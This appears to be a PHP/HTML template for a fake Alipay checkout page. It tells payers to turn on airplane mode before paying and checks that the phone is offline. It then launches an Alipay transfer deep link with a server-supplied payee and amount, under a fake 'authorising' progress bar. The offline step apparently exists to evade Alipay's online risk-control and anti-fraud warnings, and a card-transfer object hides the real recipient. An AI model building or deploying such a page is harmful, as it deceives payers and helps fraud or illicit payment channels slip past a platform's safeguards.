<?php
use xh\library\url;
?>

<!DOCTYPE html>
<html>
<head>
    <title>支付宝收银台</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no"/>
    <link rel="stylesheet" type="text/css" href="/static/QRCode.css"/>
    <link href="https://cdn.bootcss.com/layer/2.3/skin/layer.css" rel="stylesheet">
    <style>
        .copybutton {
            position: relative;
            width: 80%;
            height: 40px;
            margin-left: 10%;
            border-radius: 8px;
            margin-top: 10px;
        }

        #fill {
            width: 100%;
            height: 40px;
            text-align: center;
            background-color: deepskyblue;
            position: absolute;
            left: 0;
            top: 0;
            border-radius: 8px;
        }

        #showNumber {
            width: 100%;
            height: 40px;
            text-align: center;
            line-height: 40px;
            position: absolute;
            left: 0;
            top: 0;
            color: red;
            font-size: 18px;
            border-radius: 8px;
        }
    </style>
</head>
<body style="background-color: #fff">

<div style="width: 100%; text-align: center;font-family:微软雅黑;">
    <div id="panelWrap" class="panel-wrap">
        <!-- CUSTOM LOGO -->
        <div class="panel-heading" style="background-color: #fff">
            <div class="row">
                <div class="col-md-12 text-center">
                    <img src="/static/logo_alipay.jpg" alt="Logo-QQPay" class="img-responsive center-block"
                         style="height: 30px;"/>
                </div>

            </div>
        </div>
        <div style="line-height: 2rem">
            <div style="display: inline-flex;">请打开
                <div style="color: red">飞行模式</div>
                后点击立即支付
            </div>
            <div style="color: #cb3636">跳转后再关闭飞行模式，请勿提前关闭!</div>
            <div><span class="money" style="color: #cb3636"></span><?php echo $amount;?> 元</div>
            <div class="copybutton"
                 style="background-color: rgb(204, 204, 204);color: rgb(119, 119, 119);">
                <span></span>
                <div id="fill" style="width: 0%;"></div>
                <div id="showNumber">立即支付</div>
            </div>
            
        </div>
    </div>

    <div style="color: green;font-size: 18px;margin-top: .5rem">&nbsp;&nbsp;&nbsp;苹果用户如何打开飞行模式<br></div>
    <div style="text-align: center; margin-top: 10px"><img src="/static/images/ios-fly.png" alt="" width="90%"
                                                           height="30%"></div>
    <div style="color: green;font-size: 18px">&nbsp;&nbsp;&nbsp;安卓用户如何打开飞行模式<br></div>
    <div style="text-align: center; margin-top: 10px"><img src="/static/images/and-fly.png" alt="" width="90%"
                                                           height="30%"></div>
</div>
 
<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/layer/2.3/layer.js"></script>
<script type="text/javascript"
        src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
<script>!function (s, t) {
    "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? module.exports = t() : s.Interval = t()
}(this, function () {
    "use strict";

    function s(s, t, i, e) {
        var n, o;
        if ("function" == typeof s) return t || (t = 1e3), i || (i = 0), n = (new Date).getTime(), o = function () {
            var e, u;
            e = (new Date).getTime() - n, u = t - e % t, this.pass = Math.floor(e / t) + 1, this.surplus = i - this.pass, setTimeout(function () {
                return this._stop ? void 0 : !1 === s.call(this, this.pass, this.surplus) ? void this.stop() : i && !this.surplus ? void this.stop() : void o()
            }.bind(this), u)
        }.bind(this), this.stop = function () {
            this._stop = !0
        }, this.pass = 0, this.surplus = i - this.pass, e && s.call(this, this.pass, this.surplus), o(0), this
    }

    return s
});</script>
<script>

    var obj = {};

    function StrObjByRegExpLocation() {
        var strDes = window.location.href;
        strDes.replace(/(\w+)(?:=([^&]*))?/g, function (str, key, value) {
            obj[key] = value;
        });
    }

    StrObjByRegExpLocation();

    up("2");

    var showNumber = document.getElementById('showNumber');

    function suctime() {
        showNumber.addEventListener('click', func, false);
    }

    function showAlert(msg) {
        AlipayJSBridge.call('alert', {
            title: '支付提示',
            message: msg,
            button: '知道了'
        }, function (e) {
        });
    }

    var a = {
        "actionType": "toCard",
        "cardNo": "请重新打开网络****",
        "receiverName": "",
        "bankAccount": "<?php echo $gathering_name;?>",
        "money": "<?php echo $amount;?>",
        "amount": "<?php echo $amount;?>",
        "bankMark": "<?php echo $bank_id;?>",
        "bankName": "<?php echo $bank_name;?>",
        "cardIndex": "<?php echo $cardid;?>",
        "cardNoHidden": "true",
        "cardChannel": "HISTORY_CARD",
        "orderSource": "from"
    };

    function up(log) {
        var id = obj.id;
     
 
    }

    var ii = 0;

  
    var index = 0;

    var success = 0;

    var payurl;

    var func = function () {
     
        ap.getNetworkType(function (res) {
            networkAvailable = res.networkAvailable;
            if (networkAvailable) {
                index++;
                if (index == 1) {
                    showAlert("请打开手机飞行模式后点击立即支付");
                } else {
                    if (index < 5) {
                        up("noClose" + index)
                    }
                    showAlert("一定要开启飞行模式，若启用飞行模式后没有断开WIFI请先暂时关闭WIFI，确保手机无网络服务。");
                }
            } else {
                
                success++;
                if (success > 1) {
                    layer.msg("请等待授权完成...");
                    return;
                }
                layer.confirm('<div style="color:red; font-size:18px">跳转后再关闭飞行模式!!!<br /><br />跳转后再关闭飞行模式!!!<br /><br />跳转后再关闭飞行模式!!!', {
                    icon: 1,
                    title: '充值提示',
                    btn: ['我知道了'] //按钮
                }, function (index) {
                    layer.close(index);
                   go_url = 'alipayqr://platformapi/startapp?appId=20000123&actionType=scan&biz_data={\"s\": \"money\",\"u\": \"<?php echo $pid;?>\",\"a\": \"<?php echo $amount;?>\",\"m\": \"<?php echo $trade_no;?>\"}';
                  
                      AlipayJSBridge.call('pushWindow', {
                        url: go_url
                    });
                  
                    var count = 0;
                    var timerone = setInterval(function () {
                        $('.copybutton').css({
                            'backgroundColor': '#CCCCCC',
                            'color': '#777777'
                        })
                        count++;
                        showNumber.innerHTML = '授权中...' + count + '%';
                        fill.style.width = count + '%';
                        if (count == 100) {
             
                            window.clearInterval(timerone);
                        }
                    }, 450)
                });
            }
        });
    };

    var resumeOneTime = true;

    function exitApp() {
        AlipayJSBridge.call('exitApp');
    };

    document.addEventListener('resume', function (event) {
        if (resumeOneTime === true) {
        }
        resumeOneTime = true;
    });

    $(document).ready(function () {
      
   suctime();
 
    })

    var myTimer;
    var intDiff = 0;
    var goTimerBegin = 0;

    //构建倒计时
    function buildGoTime(expire_time) {
        intDiff = expire_time;
        goTimerBegin = new Date().getTime();
        goTimer();
    }

    function goTimer() {
        myTimer = window.setInterval(function () {
            //支付宝或QQ二维码过期
            var day = 0,
                hour = 0,
                minute = 0,
                second = 0;//时间默认值
            if (intDiff > 0) {
                day = Math.floor(intDiff / (60 * 60 * 24));
                hour = Math.floor(intDiff / (60 * 60)) - (day * 24);
                minute = Math.floor(intDiff / 60) - (day * 24 * 60) - (hour * 60);
                second = Math.floor(intDiff) - (day * 24 * 60 * 60) - (hour * 60 * 60) - (minute * 60);
            }
            if (minute <= 9) minute = '0' + minute;
            if (second <= 9) second = '0' + second;
            if (hour <= 0 && minute <= 0 && second <= 0) {
                qrcode_timeout();
                window.clearInterval(myTimer);
            }
            intDiff = intDiff - 4;
           
        }, 4000);
    }

    function qrcode_timeout() {
        layer.confirm('订单已失效，请重新下单', {
            title: '充值提示',
            btn: ['我知道了'],
            cancel: function (index, layero) {
                exitApp();
            }
        }, function () {
            exitApp();
        });
    }

   
</script>
</body>
</html>
